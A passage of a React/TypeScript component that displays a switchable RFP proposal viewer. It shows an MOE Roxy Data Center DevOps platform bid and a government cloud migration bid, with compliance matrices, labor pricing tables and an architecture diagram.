    { id: "REQ-01", section: "Section 1 & 2", name: "Sovereign Air-Gapped Deployment", desc: "Unified DevOps platform deployed 100% on-premises at Roxy Data Center with zero outbound telemetry dependencies.", test: "Air-gap network egress blocking test; bare-metal hypervisor cluster verification.", status: "COMPLIANT" },
    { id: "REQ-02", section: "Section 3", name: "Full Lifecycle Turnkey Support", desc: "Turnkey delivery covering architecture design, clustered deployment, AD integration, 5 training tracks, and hypercare.", test: "Milestone signoff protocol across all 5 deployment stages.", status: "COMPLIANT" },
    { id: "REQ-03", section: "Section 4.1", name: "Distributed Git SCM & Code Review", desc: "Enterprise Git core with protected branch policies, required peer review gates, signed commits, and granular RBAC.", test: "Tamper-evident audit log verification for push, pull, and review events.", status: "COMPLIANT" },
    { id: "REQ-04", section: "Section 4.2", name: "Declarative CI/CD & Distributed Runners", desc: "Version-controlled YAML pipeline definitions with parallel containerized runners, matrix builds, and artifact caching.", test: "End-to-end automated parallel test pipeline execution under load.", status: "COMPLIANT" },
    { id: "REQ-05", section: "Section 4.3", name: "Agile Project & Work Management", desc: "Integrated Scrum and Kanban sprint planning boards, portfolio roadmaps, milestone tracking, and commit traceability.", test: "Bidirectional commit-to-issue reference linking and burndown chart calculation.", status: "COMPLIANT" },
    { id: "REQ-06", section: "Section 4.4", name: "Universal Package & Artifact Registry", desc: "Air-gapped proxy caching and storage for Docker/OCI container images, Maven, npm, PyPI, Helm, and NuGet packages.", test: "SHA-256 package verification, local proxy pull in air-gapped network mode.", status: "COMPLIANT" },
    { id: "REQ-07", section: "Section 4.5", name: "Enterprise Identity & Active Directory", desc: "Native integration with MOE Active Directory and LDAP trees with automated group-to-role synchronization and CEF audit logging.", test: "SAML 2.0 / Kerberos SSO login and group membership role mapping.", status: "COMPLIANT" },
    { id: "REQ-08", section: "Section 5.1", name: "Integrated DevSecOps Security Suite", desc: "Continuous SAST (OWASP Top 10), SCA dependency vulnerability checking, pre-receive secret scanning, and container inspection.", test: "Automatic pipeline termination upon detecting high/critical CVEs or leaked credentials.", status: "COMPLIANT" },
    { id: "REQ-09", section: "Section 5.2", name: "Infrastructure as Code (IaC) Support", desc: "Native execution and linting for Terraform, Ansible, and Kubernetes manifests with Open Policy Agent guardrails.", test: "Automated policy-as-code linting and staging dry-run plan generation.", status: "COMPLIANT" },
    { id: "REQ-10", section: "Section 5.3", name: "Multi-Environment Deployment Strategies", desc: "Automated Canary traffic splitting (5% -> 25% -> 100%), Blue/Green VIP switching, and zero-downtime rolling updates.", test: "Zero-packet-drop VIP failover and instant rollback drill.", status: "COMPLIANT" },
    { id: "REQ-11", section: "Section 5.4", name: "Real-Time Observability & Monitoring", desc: "Pipeline performance analytics, developer metrics, operational dashboards, and syslog forwarding to MOE central SIEM.", test: "Real-time alert dispatch to MOE Network Operations Center webhook.", status: "COMPLIANT" },
    { id: "REQ-12", section: "Section 5.5", name: "OpenAPI 3.0 REST Endpoints & Webhooks", desc: "Comprehensive programmatic access via authenticated REST APIs and bi-directional webhook event dispatchers.", test: "Automated API contract testing and event webhook listener validation.", status: "COMPLIANT" },
    { id: "REQ-13", section: "Section 6.1-6.2", name: "Policy Enforcement & DORA Metrics", desc: "Two-person integrity approval gates for production deployments; real-time DORA productivity & lead time analytics.", test: "Multi-signature production deployment challenge hold and audit pack export.", status: "COMPLIANT" },
    { id: "REQ-14", section: "Section 6.3-6.4", name: "High Availability & Automated DR", desc: "Active/active clustered architecture with PostgreSQL Patroni replication; continuous WAL archiving with RPO < 1h, RTO < 2h.", test: "Simulated hardware failure failover drill and bare-metal disaster recovery restoration.", status: "COMPLIANT" },
    { id: "REQ-15", section: "Section 7-11", name: "Turnkey Package, Licensing & 24/7 SLA", desc: "Unlimited Enterprise platform license; complete runbooks; 5 comprehensive training workshops; 24/7 Tier-3 warranty support.", test: "15-minute response SLA drill for Sev-1 incident simulation.", status: "COMPLIANT" },
  ];

  const currentCompliance = proposalVersion === "latest" ? latestComplianceItems : complianceItems;

  const filteredCompliance = currentCompliance.filter((item) => {
    if (!searchFilter.trim()) return true;
    const q = searchFilter.toLowerCase();
    return item.id.toLowerCase().includes(q) || item.name.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q) || item.section.toLowerCase().includes(q);
  });

  const latestLaborRows = [
    { tier: "Tier 1: Junior Engineer", duties: "Basic configuration, routine log audits, and baseline test scripting.", rate: 50.00, hours: 0, total: 0.00 },
    { tier: "Tier 2: Mid Engineer", duties: "MFA IAM integration (40 hrs), geo-backup setup (30 hrs), uptime SLA automation (100 hrs).", rate: 80.00, hours: 170, total: 13600.00 },
    { tier: "Tier 3: Senior Engineer", duties: "FIPS AES-256 encryption (60 hrs), SIEM integration (80 hrs), U.S. residency (20 hrs), pen test (50 hrs), latency (70 hrs).", rate: 120.00, hours: 280, total: 33600.00 },
    { tier: "Tier 4: Architect", duties: "Overall cloud migration platform design and defense-in-depth architectural governance.", rate: 150.00, hours: 0, total: 0.00 },
    { tier: "Tier 5: Project Manager", duties: "Quarterly ISO/IEC 27001 audit report synthesis, compliance traceability sign-off, stakeholder deliverables.", rate: 110.00, hours: 30, total: 3300.00 },
  ];

  const laborRows = [
    { tier: "Tier 1: Senior Principal DevOps Architect", duties: "High-availability design, Roxy DC network integration, disaster recovery topology, security compliance signoff.", rate: 210, hours: 120, total: 25200 },
    { tier: "Tier 2: Lead DevSecOps & Pipeline Engineers", duties: "SCM configuration, CI/CD runner clustering, SAST/DAST pipeline integration, IaC deployment templates.", rate: 160, hours: 280, total: 44800 },
    { tier: "Tier 3: Systems Integration & Identity Specialists", duties: "Active Directory / LDAP federation, SSO implementation, SIEM log forwarding, storage array configuration.", rate: 130, hours: 160, total: 20800 },
    { tier: "Tier 4: Training & Documentation Specialists", duties: "Technical user manuals, administrator runbooks, and 5 interactive training workshops for MOE teams.", rate: 100, hours: 100, total: 10000 },
    { tier: "Tier 5: 24/7 Hypercare & Operations Engineers", duties: "Dedicated 30-day post-go-live hypercare, real-time issue resolution, and performance tuning.", rate: 90, hours: 140, total: 12600 },
  ];

  const currentLabor = proposalVersion === "latest" ? latestLaborRows : laborRows;

  const currentMarkdown = proposalVersion === "latest" ? GOV_CLOUD_PROPOSAL_MARKDOWN : RFP_PROPOSAL_MARKDOWN;

  function copyMarkdown() {
    navigator.clipboard.writeText(currentMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadMarkdown() {
    const blob = new Blob([currentMarkdown], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = proposalVersion === "latest" ? "create_proposal_deliverable_report.md" : "moe_devops_server_rfp_proposal.md";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  return (
    <div className="proposal-shell">
      {/* Version Selector Bar */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", background: "#f0f6f4", border: "1px solid #cce2d9", padding: "8px 16px", borderRadius: "6px", marginBottom: "14px", flexWrap: "wrap", gap: "10px" }}>
        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
          <span style={{ fontSize: "11px", fontWeight: 700, color: "#163a33", textTransform: "uppercase", letterSpacing: "0.5px" }}>Active Proposal:</span>
          <button
            type="button"
            onClick={() => setProposalVersion("latest")}
            style={{
              padding: "5px 12px",
              fontSize: "11px",
              fontWeight: proposalVersion === "latest" ? 700 : 500,
              background: proposalVersion === "latest" ? "#195d56" : "#ffffff",
              color: proposalVersion === "latest" ? "#ffffff" : "#455953",
              border: "1px solid #cadcd4",
              borderRadius: "4px",
              cursor: "pointer",
              boxShadow: proposalVersion === "latest" ? "0 1px 3px rgba(0,0,0,0.08)" : "none",
            }}
          >
            ✨ Government Cloud Migration (New RFP · $50,500.00 · 9/9 Criteria)
          </button>
          <button
            type="button"
            onClick={() => setProposalVersion("moe")}
            style={{
              padding: "5px 12px",
              fontSize: "11px",
              fontWeight: proposalVersion === "moe" ? 700 : 500,
              background: proposalVersion === "moe" ? "#195d56" : "#ffffff",
              color: proposalVersion === "moe" ? "#ffffff" : "#455953",
              border: "1px solid #cadcd4",
              borderRadius: "4px",
              cursor: "pointer",
              boxShadow: proposalVersion === "moe" ? "0 1px 3px rgba(0,0,0,0.08)" : "none",
            }}
          >
            🏛️ MOE Roxy DC DevOps Proposal (Baseline · $161,400.00)
          </button>
        </div>
        <span style={{ fontSize: "10px", color: "#607870" }}>
          {proposalVersion === "latest" ? "Synthesized: 2026-10-26 20:44:23 UTC · Arena 2abc18" : "Baseline Specification · 15/15 Compliant"}
        </span>
      </div>

      <PageTitle
        eyebrow={proposalVersion === "latest" ? "RFP DELIVERABLE · GOVERNMENT CLOUD MIGRATION · ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18" : "RFP DELIVERABLE · MINISTRY OF EDUCATION (MOE) · ROXY DATA CENTER"}
        title={proposalVersion === "latest" ? "Government Cloud Migration Proposal (New RFP)" : "DevOps Server Platform Proposal"}
        subtitle={proposalVersion === "latest" ? "Autonomous executive proposal with 9 mandatory compliance criteria and tiered labor model for government workloads." : "Complete technical and commercial proposal for sovereign, air-gapped on-premises implementation at Roxy Data Center."}
        action={
          <>
            {onBack && (
              <button
                className="secondary-button"
                onClick={onBack}
                style={{ display: "inline-flex", alignItems: "center", gap: "6px", fontWeight: 700, color: "#195d56", background: "#ffffff" }}
              >
                <ArrowRight size={13} style={{ transform: "rotate(180deg)" }} /> All Deliverables
              </button>
            )}
            <button className="secondary-button" onClick={copyMarkdown}>
              {copied ? <Check size={14} color="#236f66" /> : <Copy size={14} />} {copied ? "Copied proposal" : "Copy Markdown"}
            </button>
            <button className="secondary-button" onClick={downloadMarkdown}>
              <Download size={14} /> Download .md
            </button>
            <button className="secondary-button" onClick={() => window.print()}>
              <Printer size={14} /> Print / Export PDF
            </button>
            {onNavigate && (
              <button className="primary-button" onClick={() => onNavigate("Decision rooms")}>
                <FileCheck2 size={14} /> Decision Rooms
              </button>
            )}
          </>
        }
      />

      <div className="scope" style={{ marginBottom: "16px" }}>
        <span><Layers3 size={14} /> {proposalVersion === "latest" ? "ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18" : "RFP-MOE-ROXY-DEVOPS-2026-01"}</span>
        <i />
        <span><Dot color="green" /> {proposalVersion === "latest" ? "9/9 CRITERIA COMPLIANT (FEDRAMP & DOD)" : "15/15 REQUIREMENTS COMPLIANT"}</span>
        <i />
        <span><Server size={14} /> {proposalVersion === "latest" ? "GOVCLOUD (U.S. REGION)" : "ROXY DATA CENTER (AIR-GAPPED)"}</span>
        <i />
        <span>{proposalVersion === "latest" ? "$50,500.00 USD (Turnkey Labor Pricing)" : "$161,400.00 USD (800h + Perpetual Lic.)"}</span>
        <small>Status: Verified &amp; Ratified</small>
      </div>

      <div
        style={{
          background: "linear-gradient(135deg, #1b3531 0%, #152928 50%, #1c3e39 100%)",
          border: "1px solid #2e5952",
          borderRadius: "8px",
          padding: "22px 28px",
          color: "#eef5f2",
          boxShadow: "0 4px 20px rgba(18, 38, 34, 0.15)",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: "18px",
          marginBottom: "16px",
        }}
      >
        <div style={{ flex: "1 1 560px" }}>
          <div style={{ fontSize: "9px", fontWeight: 700, letterSpacing: "1px", textTransform: "uppercase", color: "#8ce0c8", marginBottom: "4px" }}>
            {proposalVersion === "latest" ? "CASE: ARENA-ENTERPRISE-RFP-PROPOSAL-2ABC18" : "DOCUMENT ID: RFP-MOE-ROXY-DEVOPS-2026-01"}
          </div>
          <h2 style={{ fontSize: "20px", fontWeight: 700, margin: "4px 0 8px", color: "#ffffff", letterSpacing: "-0.2px" }}>
            {proposalVersion === "latest" ? "Executive Proposal for Government Cloud Migration RFP" : "DevOps Server Sovereign Implementation Proposal"}
          </h2>
          <p style={{ color: "#a5bfb8", fontSize: "11.5px", margin: 0, lineHeight: 1.55, maxWidth: "680px" }}>
            {proposalVersion === "latest" ? "We present a secure, compliant, and cost-effective migration of the government's on-premises workloads to a U.S.-based cloud environment satisfying all mandatory technical criteria." : "Prepared for the Ministry of Education Procurement & Evaluation Committee. Fully sovereign on-premises deployment at Roxy Data Center with 100% data residency, zero outbound dependencies, and unified DevSecOps governance."}
          </p>
          <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", marginTop: "12px" }}>
            {proposalVersion === "latest" ? (
              <>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#23584e", color: "#8ee0c9", border: "1px solid #337a6b" }}>
                  <BadgeCheck size={12} /> 9/9 Mandatory Criteria Met (CR-001–CR-009)
                </span>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#243e5c", color: "#9ec6fb", border: "1px solid #36608e" }}>
                  <Server size={12} /> FedRAMP High &amp; DoD 8500.01
                </span>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#4d3725", color: "#f7ba8f", border: "1px solid #785034" }}>
                  <Shield size={12} /> FIPS 140-2 AES-256
                </span>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#1f4f46", color: "#7ee0ca", border: "1px solid #2c6e61" }}>
                  <LockKeyhole size={12} /> SIEM &amp; MFA
                </span>
              </>
            ) : (
              <>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#23584e", color: "#8ee0c9", border: "1px solid #337a6b" }}>
                  <BadgeCheck size={12} /> 15/15 Requirements Compliant
                </span>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#243e5c", color: "#9ec6fb", border: "1px solid #36608e" }}>
                  <Server size={12} /> Air-Gapped Roxy Data Center
                </span>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#4d3725", color: "#f7ba8f", border: "1px solid #785034" }}>
                  <Shield size={12} /> Sovereign On-Premises Architecture
                </span>
                <span style={{ display: "inline-flex", alignItems: "center", gap: "5px", padding: "4px 9px", borderRadius: "4px", fontSize: "9px", fontWeight: 700, letterSpacing: "0.5px", textTransform: "uppercase", background: "#1f4f46", color: "#7ee0ca", border: "1px solid #2c6e61" }}>
                  <LockKeyhole size={12} /> Active Directory SSO
                </span>
              </>
            )}
          </div>
        </div>
        <div style={{ textAlign: "right", display: "flex", flexDirection: "column", gap: "4px", minWidth: "220px", background: "rgba(0,0,0,0.22)", padding: "14px 18px", borderRadius: "6px", border: "1px solid rgba(255,255,255,0.08)" }}>
          <div style={{ fontSize: "10px", color: "#a5bfb8", textTransform: "uppercase", letterSpacing: "1px", fontWeight: 700 }}>
            {proposalVersion === "latest" ? "AGGREGATE PROPOSAL PRICING" : "TURNKEY FIXED-PRICE"}
          </div>
          <div style={{ fontSize: "28px", fontWeight: 800, color: "#ffffff", fontFamily: "var(--font-geist-mono), monospace" }}>
            {proposalVersion === "latest" ? "$50,500.00" : "$161,400.00"}
          </div>
          <div style={{ fontSize: "10px", color: "#8ce0c8", fontWeight: 600 }}>
            {proposalVersion === "latest" ? "5-Tier Specialized Labor (480 hrs)" : "800 Engineering Hours + Unlimited License"}
          </div>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(230px, 1fr))", gap: "12px", marginBottom: "18px" }}>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <DollarSign size={14} color="#236f66" /> Total Commercial Value
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            {proposalVersion === "latest" ? "$50,500.00" : "$161,400.00"}
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            {proposalVersion === "latest" ? "100% Itemized Professional Services" : "$113,400 Labor + $48,000 Software License"}
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <BadgeCheck size={14} color="#236f66" /> RFP Requirement Compliance
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            {proposalVersion === "latest" ? "9 / 9" : "15 / 15"}
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            {proposalVersion === "latest" ? "100% Mandatory Compliance (CR-001–CR-009)" : "100% Traceability · Zero Deviations"}
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Server size={14} color="#236f66" /> Target Installation Site
          </span>
          <span style={{ fontSize: "19px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.3px" }}>
            {proposalVersion === "latest" ? "GovCloud (U.S. Region)" : "Roxy Data Center"}
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            {proposalVersion === "latest" ? "FedRAMP High & DoD 8500.01 Multi-Region" : "Sovereign Air-Gapped On-Premises Cluster"}
          </span>
        </div>
        <div style={{ background: "#ffffff", border: "1px solid #dfe7e3", borderRadius: "6px", padding: "14px 16px", display: "flex", flexDirection: "column", gap: "4px", boxShadow: "0 1px 3px rgba(18, 36, 32, 0.04)" }}>
          <span style={{ fontSize: "9px", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.8px", color: "#6a7c76", display: "flex", alignItems: "center", gap: "6px" }}>
            <Calendar size={14} color="#236f66" /> Implementation Timeline
          </span>
          <span style={{ fontSize: "22px", fontWeight: 800, color: "#162a26", letterSpacing: "-0.5px", fontFamily: "var(--font-geist-mono), monospace" }}>
            {proposalVersion === "latest" ? "12 Weeks" : "16 Weeks"}
          </span>
          <span style={{ fontSize: "10px", color: "#327568", fontWeight: 600 }}>
            {proposalVersion === "latest" ? "4 Phased Deployment Stages + Audit" : "5 Phased Delivery Milestones + Hypercare"}
          </span>
        </div>
      </div>

      <div style={{ display: "flex", gap: "4px", background: "#e8efe9", padding: "4px", borderRadius: "6px", border: "1px solid #dce5df", marginBottom: "16px", overflowX: "auto" }}>
        {[
          { id: "summary", label: "Executive Summary & Scope", icon: FileText },
          { id: "architecture", label: "Air-Gapped Architecture", icon: Server },
          { id: "compliance", label: "Compliance Matrix (15/15)", icon: BadgeCheck },
          { id: "pricing", label: "Commercial & Labor Pricing", icon: DollarSign },
          { id: "roadmap", label: "16-Week Implementation Roadmap", icon: Calendar },
          { id: "transmittal", label: "Transmittal & Sign-Off Letter", icon: FileClock },
        ].map(({ id, label, icon: TabIcon }) => {
          const isActive = activeTab === id;
          return (
            <button
              key={id}
              type="button"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "7px",
                padding: "8px 14px",
                fontSize: "11px",
                fontWeight: isActive ? 700 : 600,
                color: isActive ? "#195d56" : "#566862",
                background: isActive ? "#ffffff" : "transparent",
                border: isActive ? "1px solid #c9d8d1" : "1px solid transparent",
                borderRadius: "4px",
                cursor: "pointer",
                whiteSpace: "nowrap",
                boxShadow: isActive ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
                transition: "all 0.15s ease",
              }}
              onClick={() => setActiveTab(id as typeof activeTab)}
            >
              <TabIcon size={14} color={isActive ? "#236f66" : "#72837d"} />
              <span>{label}</span>
            </button>
          );
        })}
      </div>

      {activeTab === "summary" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">EXECUTIVE DOSSIER</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Strategic Purpose &amp; Project Scope</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>
                {proposalVersion === "latest" ? "Autonomous executive proposal satisfying mandatory technical criteria, multi-tier labor pricing, and compliance matrix." : "Modernizing software development, automated testing, and continuous delivery across the Ministry of Education."}
              </p>
            </div>
            <Badge tone="green">Verified &amp; Ratified</Badge>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))", gap: "20px", fontSize: "12px", lineHeight: "1.65", color: "#374d46" }}>
            <div style={{ background: "#f8faf9", padding: "18px 20px", borderRadius: "6px", border: "1px solid #e3ece7" }}>
              <strong style={{ display: "block", color: "#16332b", fontSize: "13px", marginBottom: "8px" }}>
                🎯 Operational Imperatives Addressed
              </strong>
              {proposalVersion === "latest" ? (
                <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                  <li><strong>Mandatory Admin MFA (CR-001):</strong> NIST SP 800-63B IAM conditional access for all administrative sessions ($3,200.00).</li>
                  <li><strong>FIPS 140-2 AES-256 (CR-002):</strong> DoD 8500.01 cryptographic encryption at rest for cloud volumes and databases ($7,200.00).</li>
                  <li><strong>Continuous SIEM Integration (CR-003):</strong> Real-time security telemetry streaming and automated alert triage ($9,600.00).</li>
                  <li><strong>Sovereign U.S. Residency (CR-004):</strong> Strict FedRAMP High continental U.S. tenancy boundary ($2,400.00).</li>
                </ul>
              ) : (
                <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                  <li><strong>Eliminate Tool Fragmentation:</strong> Replace disjointed tools with an all-in-one DevOps platform for SCM, CI/CD, Agile boards, and package registries.</li>
                  <li><strong>100% Sovereign Data Residency:</strong> Deploy inside the Roxy Data Center with strict air-gapping—zero telemetry or external cloud egress.</li>
                  <li><strong>Embedded DevSecOps Automation:</strong> Shift security left with automated SAST, dependency scanning, secret detection, and container image inspection.</li>
                  <li><strong>Automated Compliance &amp; Governance:</strong> Implement cryptographic two-person integrity gates before deployments hit production.</li>
                </ul>
              )}
            </div>

            <div style={{ background: "#f8faf9", padding: "18px 20px", borderRadius: "6px", border: "1px solid #e3ece7" }}>
              <strong style={{ display: "block", color: "#16332b", fontSize: "13px", marginBottom: "8px" }}>
                🏆 Key Architectural Guarantees
              </strong>
              {proposalVersion === "latest" ? (
                <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                  <li><strong>Geo-Separated Backup (CR-005):</strong> Secondary disaster recovery region ≥500 miles away per DoD 8500.01 ($2,400.00).</li>
                  <li><strong>Quarterly ISO 27001 Audits (CR-006):</strong> Automated compliance pack generation and governance oversight ($3,300.00).</li>
                  <li><strong>Accredited Pen Testing (CR-007):</strong> Annual third-party penetration testing and SLA remediation ($6,000.00).</li>
                  <li><strong>99.95% SLA &amp; Latency &le;200ms (CR-008/009):</strong> High availability multi-zone auto-scaling ($16,400.00).</li>
                  <li><strong>Total Fixed Investment:</strong> 5-tier specialized labor schedule totaling exactly <strong>USD $50,500.00</strong>.</li>
                </ul>
              ) : (
                <ul style={{ paddingLeft: "18px", margin: 0, display: "flex", flexDirection: "column", gap: "6px" }}>
                  <li><strong>High Availability (HA):</strong> Active/active application nodes fronted by load balancers with automated PostgreSQL Patroni failover.</li>
                  <li><strong>Enterprise Identity:</strong> Direct integration with MOE Active Directory and LDAP trees with role-based access control (RBAC).</li>
                  <li><strong>Disaster Recovery:</strong> Automated point-in-time recovery with continuous WAL archiving; RPO &lt; 1 hr, RTO &lt; 2 hrs.</li>
                  <li><strong>Turnkey Training:</strong> 5 comprehensive training tracks for MOE platform engineers, system administrators, and developers.</li>
                </ul>
              )}
            </div>
          </div>

          <div>
            <div className="eyebrow" style={{ marginBottom: "10px" }}>CORE FUNCTIONAL MODULES INCLUDED</div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))", gap: "12px" }}>
              {(proposalVersion === "latest" ? [
                { title: "Hybrid Cloud Connectivity", desc: "Secure Direct Connect and VPN tunnels with hardware-backed TLS 1.2+ encryption for on-prem to cloud transit." },
                { title: "KMS Compute & Storage Layer", desc: "Managed cloud compute and storage with AES-256 volume encryption and automated cryptographic key rotation." },
                { title: "Zero-Trust Identity Plane", desc: "Centralized IAM directory integration with mandatory MFA challenge, least-privilege RBAC, and access audit trails." },
                { title: "Real-Time NIST Compliance Engine", desc: "Automated policy enforcement against NIST SP 800-53 controls with continuous security telemetry dashboards." },
                { title: "Automated Pen-Test Pipeline", desc: "Integrated CI/CD vulnerability scanning and annual penetration testing report generation with 70% reduced effort." },
                { title: "Transparent Pricing Breakdown", desc: "Itemized labor tier multipliers, hourly rates, and hours-per-day linked directly to each compliance criterion." },
              ] : [
                { title: "Distributed SCM Engine", desc: "Enterprise Git core with branch protections, code reviews, signed commits, and complete audit trail." },
                { title: "Declarative CI/CD Pipelines", desc: "Version-controlled YAML pipelines with autoscaling container runners, parallel matrix builds, and caching." },
                { title: "Agile Project & Work Tracking", desc: "Scrum & Kanban boards, epic roadmaps, sprint planning, and bi-directional commit-to-issue traceability." },
                { title: "Universal Package Registry", desc: "Air-gapped proxy and caching for OCI containers, Maven, npm, PyPI, Helm, and NuGet packages." },
                { title: "Continuous DevSecOps Suite", desc: "Built-in OWASP Top 10 SAST, dependency vulnerability scanning, pre-receive secret blockers, and container audits." },
                { title: "Multi-Environment Deployment", desc: "Automated Canary traffic splitting (5% -> 100%), Blue/Green VIP switching, and zero-downtime rolling updates." },
              ]).map((m) => (
                <div key={m.title} style={{ padding: "14px 16px", background: "#fbfdfc", border: "1px solid #dce6e1", borderRadius: "6px" }}>
                  <strong style={{ display: "block", fontSize: "12px", color: "#194d43", marginBottom: "5px" }}>{m.title}</strong>
                  <p style={{ margin: 0, fontSize: "11px", color: "#5d706a", lineHeight: "1.45" }}>{m.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </section>
      )}

      {activeTab === "architecture" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)", display: "flex", flexDirection: "column", gap: "20px" }}>
          <div className="proposal-section-heading" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingBottom: "12px", borderBottom: "1px solid #edf3ef" }}>
            <div>
              <div className="eyebrow">SOVEREIGN AIR-GAPPED TOPOLOGY</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Roxy Data Center Architecture Blueprint</h3>
              <p style={{ fontSize: "11px", color: "#6b7e77", margin: "2px 0 0" }}>High-availability on-premises infrastructure specification designed specifically for the Roxy Data Center environment.</p>
            </div>
            <Badge tone="blue">Isolated On-Premises</Badge>
          </div>

          <div style={{ background: "#172624", border: "1px solid #284c44", padding: "20px", borderRadius: "6px", color: "#d9e8e3", fontFamily: "var(--font-geist-mono), monospace", fontSize: "11px", lineHeight: "1.6", overflowX: "auto" }}>
            <div style={{ color: "#74e2c8", fontWeight: 700, marginBottom: "8px" }}>ROXY DATA CENTER - AIR-GAPPED NETWORK TOPOLOGY</div>
            <pre style={{ margin: 0 }}>{`+--------------------------------------------------------------------------------------------------------+
|                                    ROXY DATA CENTER SOVEREIGN NETWORK                                   |
|                                                                                                        |
|  [ Perimeter & Identity Access Layer ]                                                                 |
|         |                                                                                              |
|         +---> HA Load Balancer / Reverse Proxy (F5 / NGINX Plus) [Internal TLS 1.3 Termination]        |
|         |     |                                                                                        |
|         +---> MOE Active Directory / OpenLDAP Integration [Kerberos / SAML 2.0 SSO]                     |
|                                                                                                        |
|  [ Clustered DevOps Server Control Plane ]                                                              |
|         +---------------------------------------+---------------------------------------+              |
|         |   DevOps Server Node 1 (Primary)      |   DevOps Server Node 2 (Active Failover)              |
|         |   - Distributed Git SCM Engine        |   - Distributed Git SCM Engine        |              |
|         |   - Universal Package & Artifacts     |   - Universal Package & Artifacts     |              |
|         |   - Agile Work & Scrum Boards         |   - Agile Work & Scrum Boards         |              |
|         +---------------------------------------+---------------------------------------+              |
